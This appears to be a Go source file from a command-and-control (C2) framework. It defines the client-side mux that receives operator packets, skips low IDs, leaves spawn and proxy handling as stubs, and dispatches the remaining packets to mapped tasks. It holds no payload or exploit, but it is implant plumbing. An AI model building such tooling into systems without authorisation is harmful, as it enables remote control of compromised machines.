package c2

import (
	"github.com/iDigitalFlame/xmt/c2/task"
	"github.com/iDigitalFlame/xmt/com"
)

// DefaultClientMux is the default Session Mux instance that handles the default C2 server and client functions.
// This operates cleanly with the default Server Mux instance.
var DefaultClientMux = MuxFunc(defaultClientMux)

// Mux is an interface that handles Packets when they arrive for Processing.
type Mux interface {
	Handle(*Session, *com.Packet)
}

// MuxFunc is the definition of a Mux Handler func. Once wrapped as a 'MuxFunc', these function aliases can be also
// used in place of the Mux interface.
type MuxFunc func(*Session, *com.Packet)

func defaultClientMux(s *Session, p *com.Packet) {
	s.log.Debug("[%s:Mux] Received packet %q.", s.ID, p.String())
	if p.ID < 20 {
		return
	}
	switch p.ID {
	case MvSpawn:
		// TODO: Handle spawn code here.
		return
	case MvProxy:
		// TODO: Handle proxy code here.
		return
	}
	t := task.Mappings[p.ID]
	if t == nil {
		s.log.Warning("[%s:Mux] Received Packet ID 0x%X with no Task mapping!", s.ID, p.ID)
		return
	}
	if t.Thread() {
		go doTask(t, s, p)
	} else {
		doTask(t, s, p)
	}
}

// Handle satisfies the Mux interface requirement and will process the received Packet. This function allows
// Wrapped MuxFunc objects to be used directly in place of more complex Mux definitions.
func (m MuxFunc) Handle(s *Session, p *com.Packet) {
	m(s, p)
}
